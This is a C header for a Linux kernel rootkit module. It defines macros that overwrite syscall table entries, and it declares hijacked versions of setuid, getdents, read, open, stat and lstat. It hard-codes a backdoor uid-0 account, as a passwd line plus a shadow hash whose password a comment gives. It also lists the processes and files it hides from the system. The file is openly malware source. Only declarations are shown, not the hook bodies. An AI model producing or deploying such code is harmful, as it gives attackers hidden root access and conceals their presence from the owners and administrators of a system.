#include <linux/err.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/utsname.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/slab.h>
#include <linux/proc_ns.h>

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

//macros
#define BAIL_ON_ERROR(iError)                                                 \
    if (iError) {                                                             \
        printk(KERN_ERR "ERROR [%d]- %s:%s, line %d \n",                      \
                iError,__FILE__,__FUNCTION__,__LINE__);                       \
        goto error;                                                           \
    }

#define DEBUG(msg)                                                           \
    printk(KERN_DEBUG "DEBUG [%s:%s at %d]: %s\n",         \
            __FILE__,__FUNCTION__,__LINE__, msg)

#define MAGIC_NUMBER 12345

#define BACKDOOR_PASSWD "user1:x:12345:0:backdoor:/home:/bin/bash\n"

#define BACKDOOR_SHADOW "user1:$1$MvZ75uo5$a2pTPgyDXrO6n.eyQjcmq0:16888:0:99999:7:::\n" // password is superman

#define PASSWD_FILE "/etc/passwd"

#define SHADOW_FILE "/etc/shadow"

#define MODULE_FILE "/proc/modules"

#define MODULE_NAME "rootkit"

#define HOOK_SYSCALL(sys_call_table, orig_func, hacked_func, __NR_index)    \
    orig_func = (void *)sys_call_table[__NR_index];                        \
    sys_call_table[__NR_index] = (unsigned long*)&hacked_func

#define UNHOOK_SYSCALL(sys_call_table, orig_func, __NR_index)               \
    sys_call_table[__NR_index] = (unsigned long*)orig_func

// Original system calls
asmlinkage long (*orig_setuid)(uid_t uid);
asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage long (*orig_read)(unsigned int fd, char *buf, size_t count);
asmlinkage long (*orig_open)(const char __user *filename, int flags, umode_t mode);
asmlinkage long (*orig_lstat)(const char __user *filename, 
                              struct __old_kernel_stat __user *statbuf);
asmlinkage long (*orig_stat)(const char __user *filename,
                               struct __old_kernel_stat __user *statbuf);

// Hacked system calls
asmlinkage long hacked_setuid(uid_t uid);
asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count);
asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode);
asmlinkage long hacked_lstat(const char __user *filename,
            struct __old_kernel_stat __user *statbuf);
asmlinkage long hacked_stat(const char __user *filename,
            struct __old_kernel_stat __user *statbuf);

// List of processes to hide from ps
const char * const HIDDEN_PROCESSES[] = {"bash", "ps", "sshd"};

// List of files to hide from getdents and open
const char * const HIDDEN_FILES[] = {"hideme.txt", "rootkit.c", "includes.h", 
                                        "Makefile", "I-am-secret-directory"};
